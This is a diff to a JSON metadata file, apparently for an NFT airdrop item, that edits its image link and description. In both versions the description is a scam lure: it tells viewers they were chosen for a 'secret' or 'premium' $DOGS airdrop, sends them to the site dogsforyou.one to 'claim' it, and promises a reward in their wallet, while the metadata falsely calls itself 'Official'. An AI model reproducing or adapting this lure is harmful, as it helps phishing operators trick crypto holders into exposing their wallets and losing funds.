@@ -1,5 +1,5 @@
 {
-  "image": "https://github.com/GithubDragon01/ustoevlegenda111/blob/main/creodogs.jpg",
+  "image": "https://github.com/GithubDragon01/ustoevlegenda111/blob/main/pngdogs123.png?raw=true",
   "attributes": [
     {
       "trait_type": "Official",
@@ -10,6 +10,6 @@
       "value": "True"
     }
   ],
-  "description": "You have been selected to take part in a limited premium AirDrop for $DOGS users 🎉\n 1. Go to dogsforyou.one\n 2. Claim $DOGS AirDrop\n ✅Done. Wait for the reward for your participation to be added to your wallet",
+  "description": "You are very lucky, you got into the secret DOGS AIRDROP 🎉\n 1. Go to dogsforyou.one\n 2. Claim DOGS AirDrop\n ✅Done. Wait for the reward for your participation to be added to your wallet",
   "name": "🦴82K DOGS DROP 🎲"
 }
